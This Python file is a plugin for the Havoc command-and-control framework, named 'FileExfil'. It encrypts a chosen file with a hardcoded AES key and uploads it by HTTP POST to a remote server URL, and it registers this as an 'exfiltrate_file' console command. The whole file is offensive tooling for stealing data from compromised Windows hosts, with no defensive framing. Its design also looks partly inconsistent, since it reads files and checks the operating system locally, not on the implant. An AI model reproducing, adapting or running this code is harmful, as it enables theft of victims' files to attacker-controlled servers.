from havoc import Demon, RegisterCommand, Plugin
import os
import platform
import requests
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# AES encryption key (must be 16, 24, or 32 bytes long)
AES_KEY = b'ThisIsASecretKey'

def encrypt_file(file_path, key):
    """
    Encrypts a file using AES encryption.
    """
    try:
        with open(file_path, 'rb') as f:
            plaintext = f.read()

        cipher = AES.new(key, AES.MODE_CBC)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

        encrypted_file_path = file_path + '.enc'
        with open(encrypted_file_path, 'wb') as f:
            f.write(cipher.iv + ciphertext)

        return encrypted_file_path
    except Exception as e:
        return f"[-] Error encrypting file: {e}"

def exfiltrate_file(file_path, server_url):
    """
    Exfiltrates a file to a remote server.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] File exfiltration is only supported on Windows."

        # Encrypt the file before exfiltration
        encrypted_file_path = encrypt_file(file_path, AES_KEY)
        if encrypted_file_path.startswith("[-]"):
            return encrypted_file_path

        # Read the encrypted file
        with open(encrypted_file_path, 'rb') as f:
            file_data = f.read()

        # Send the file to the remote server
        files = {'file': (os.path.basename(encrypted_file_path), file_data)}
        response = requests.post(server_url, files=files)

        if response.status_code == 200:
            return f"[+] File exfiltrated successfully: {file_path} -> {server_url}"
        else:
            return f"[-] Error exfiltrating file: {response.status_code} - {response.text}"
    except Exception as e:
        return f"[-] Error during file exfiltration: {e}"

# Havoc C2 Integration
def exfiltrate_file_command(demon, *args):
    """
    Command to exfiltrate a file to a remote server.
    """
    if len(args) != 2:
        demon.ConsoleWrite("[-] Usage: exfiltrate_file [file_path] [server_url]")
        return

    file_path = args[0]
    server_url = args[1]

    result = exfiltrate_file(file_path, server_url)
    demon.ConsoleWrite(result)

# Register commands with Havoc C2
def initialize():
    RegisterCommand("exfiltrate_file", "Exfiltrate a file to a remote server", exfiltrate_file_command)

# Initialize the plugin
plugin = Plugin("FileExfil", "Advanced file exfiltration techniques", initialize)